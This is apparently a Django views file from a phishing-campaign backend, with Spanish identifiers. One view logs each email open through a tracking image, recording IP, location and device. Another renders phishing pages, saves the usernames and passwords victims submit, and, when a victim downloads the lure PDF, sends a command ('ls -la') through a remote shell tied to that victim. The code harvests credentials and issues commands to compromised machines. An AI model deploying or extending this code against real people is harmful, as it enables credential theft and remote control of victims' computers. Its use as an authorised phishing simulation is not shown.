from django.shortcuts import render, redirect
from datetime import datetime
import geoip2.database
from user_agents import parse
from django.views.decorators.csrf import csrf_exempt
from django.http import FileResponse, Http404, JsonResponse, HttpResponse
from django.template import Context, Template
from backend.registradores.models import Estatus_Mail, Estatus_PC, Estatus_Web, Credenciales
from backend.plantillas.models import Plantillas
from backend.accesos.models import Accesos
from backend.smtp.models import Enviados
import mimetypes
import ipaddress
import os
from backend.accesos.connection_manager import ConnectionManager

def validar_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def mail_status(request, int=None):
    print("MAIL ESTATUS")
    try:
        enviado = Enviados.objects.get(id=int)
        data = registrar(request)
        Estatus_Mail.objects.filter(enviado=enviado).update(
            ip=data["ip"],
            agente=data["agente"],
            pais=data["pais"],
            metodo=request.method,
            parametros=request.GET.dict(),
            sistema_operativo=data["sistema_operativo"],
            dispositivo=data["dispositivo"],
            idioma=data["idioma"],
            fecha=data["fecha"]
        )
        print("agregado")
    except Enviados.DoesNotExist:
        print("noagregado")
        return JsonResponse({'Error': 'No se encontró el objeto Enviados con id={}'.format(int)}, safe=False)

    try:
        plantilla_id = enviado.plantilla.id
        image = Plantillas.objects.get(id=plantilla_id).imagen
    except Plantillas.DoesNotExist:
        return JsonResponse({'Error': 'No se encontró el objeto Plantillas con id={}'.format(plantilla_id)}, safe=False)

    try:
        with open(image.path, 'rb') as file:
            response = HttpResponse(file.read(), content_type=mimetypes.guess_type(image.path)[0])
            response['Content-Disposition'] = 'inline'  # Muestra la imagen en el navegador
        return response
    except FileNotFoundError:
        return JsonResponse({'Error': 'No se pudo abrir el archivo en la ruta especificada'}, safe=False)


@csrf_exempt
def web_estatus(request, int=None):
    if request.method == 'POST':
        if request.POST.get('descarga'):
            try:
                enviado = Enviados.objects.get(id=int)
                data = registrar(request)
                plantilla = Plantillas.objects.get(id=enviado.plantilla.id)
                archivo = plantilla.pdf
                file_path = archivo.path

                response = HttpResponse(content_type='application/pdf')
                response['Content-Disposition'] = 'attachment; filename="your_filename.pdf"'
                response['Content-Length'] = os.path.getsize(file_path)

                with open(file_path, 'rb') as f:
                    response.write(f.read())

                Estatus_PC.objects.filter(enviado=enviado).update(
                    ip=data["ip"],
                    agente=data["agente"],
                    pais=data["pais"],
                    metodo=request.method,
                    parametros=request.GET.dict(),
                    sistema_operativo=data["sistema_operativo"],
                    dispositivo=data["dispositivo"],
                    idioma=data["idioma"],
                    fecha=data["fecha"]
                )
                port = Accesos.objects.filter(enviado=enviado)[0].port
                # Establecer conexión y enviar comando
                connection_manager = ConnectionManager()
                shell = connection_manager.get_connection(port)
                if shell:
                    shell.send_command("ls -la")

                return response
            except Plantillas.DoesNotExist:
                return JsonResponse({'Error': 'No se encontró el objeto Plantillas con id={}'.format(enviado.plantilla.id)}, safe=False)

        if request.POST.get('credenciales'):
            try:
                enviado = Enviados.objects.get(id=int)
                data = registrar(request)
                plantilla = Plantillas.objects.get(id=enviado.plantilla.id)
                estatus_web = Estatus_Web.objects.get(enviado=enviado)
                Credenciales.objects.create(estatus_web=estatus_web, usuario=request.POST.get('usuario'), contraseña=request.POST.get('contraseña'))
                return redirect(str(plantilla.redireccion))
            except (Plantillas.DoesNotExist, Estatus_Web.DoesNotExist):
                return JsonResponse({'Error': 'No se encontró el objeto correspondiente'}, safe=False)
    
    elif request.method == 'GET':

        try:
            enviado = Enviados.objects.get(id=int)
            data = registrar(request)

            Estatus_Web.objects.filter(enviado=enviado).update(
                ip=data["ip"],
                agente=data["agente"],
                pais=data["pais"],
                metodo=request.method,
                parametros=request.GET.dict(),
                sistema_operativo=data["sistema_operativo"],
                dispositivo=data["dispositivo"],
                idioma=data["idioma"],
                fecha=data["fecha"]
            )
            plantilla = Plantillas.objects.get(id=enviado.plantilla.id)
            html = plantilla.plantilla
            enviado = Enviados.objects.get(id=int)
            usuario = enviado.correo
            return HttpResponse(Template(html).render(Context({'usuario' : usuario})))
        except Plantillas.DoesNotExist:
            return JsonResponse({'Error': 'No se encontró el objeto Plantillas con id={}'.format(enviado.plantilla.id)}, safe=False)




def registrar(request):
    ip = request.META.get('REMOTE_ADDR')
    if not validar_ip(ip):
        print(f'Dirección IP inválida: {ip}')
        ip = "Desconocido"

    agente = request.META.get('HTTP_USER_AGENT')
    geoip_reader = geoip2.database.Reader('./GeoLite2-City.mmdb')
    
    try:
        response = geoip_reader.city(ip)
        pais = response.country.name
    except (geoip2.errors.AddressNotFoundError, ValueError):
        pais = 'Desconocido'

    fecha = datetime.now()

    agente_parsed = parse(agente)
    sistema_operativo = agente_parsed.os.family
    dispositivo = agente_parsed.device.family
    
    idioma = request.META.get('HTTP_ACCEPT_LANGUAGE', "Desconocido")

    data = {
        "ip" : ip,
        "agente" : agente,
        "pais" : pais,
        "sistema_operativo" : sistema_operativo,
        "dispositivo" : dispositivo,
        "idioma" : idioma,
        "fecha" : fecha
    }

    geoip_reader.close()

    return data